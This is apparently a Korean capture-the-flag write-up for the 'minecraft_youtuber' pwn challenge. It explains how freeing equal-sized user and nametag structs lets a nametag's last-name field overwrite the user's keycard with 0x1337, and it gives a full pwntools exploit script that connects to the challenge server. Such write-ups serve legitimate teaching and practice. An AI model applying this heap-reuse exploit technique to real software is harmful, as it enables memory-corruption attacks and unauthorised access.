# minecraft_youtuber

## 코드 분석

```c
            case 7:
		            [...]
                if (curr_user->keycard == 0x1337) {
                    printf("You have freed Loki! In gratitude, he offers you a flag!\n");
                    FILE* flag = fopen(filename, "r");
                    if (flag == NULL) {
                        printf("Flag file not found. Please contact an admin.\n");
                        return EXIT_FAILURE;
                    } else {
                        char ch;
                        while ((ch = fgetc(flag)) != EOF) {
                            printf("%c", ch);
                        }
                    }
                    fclose(flag);
                    exit(0);
                    break;
                }
```

`curr_user->keycard` 의 값이 0x1337일 경우, flag를 출력해 준다.

```c
typedef struct {
    long uid;
    char username[8];
    long keycard;
} user_t;

typedef struct {
    long mfg_date;
    char first[8];
    char last[8];
} nametag_t;

void log_out() {
    free(curr_user);
    curr_user = NULL;
    if (curr_nametag != NULL) {
        free(curr_nametag);
        curr_nametag = NULL;
    }
}
```

`log_out()` 호출 시, `curr_user` → `curr_nametag`의 순으로 free가 이루어진다.

`user_t`와 `nametag_t`는 size가 동일하므로, `logout()` 후 `register_user()`를 호출하게 되면 `nametag_t.last`의 값으로 `user_t.keycard`를 덮을 수 있게 된다.

## 익스플로잇 코드

```python
from pwn import *

# r = process("./minecraft")
r = remote("minecraft.chal.cyberjousting.com", 1354)

def menu(cmd):
    r.sendlineafter(b"6. Leave\n", str(cmd).encode())
    

r.sendafter(b"username now: \n", b"dandb")

while True:
    menu(3)
    r.recvuntil(b"You have received a ")
    if r.recvuntil(b"!") == b"Name Tag!":
        # r.interactive()
        r.recvuntil(b"last name:\n")
        r.send(b"AAAAAAAA")
        r.send(p64(0x1337))
        break
    
menu(5)

r.sendafter(b"username now: \n", b"dandb")
menu(7)

    
r.interactive()
```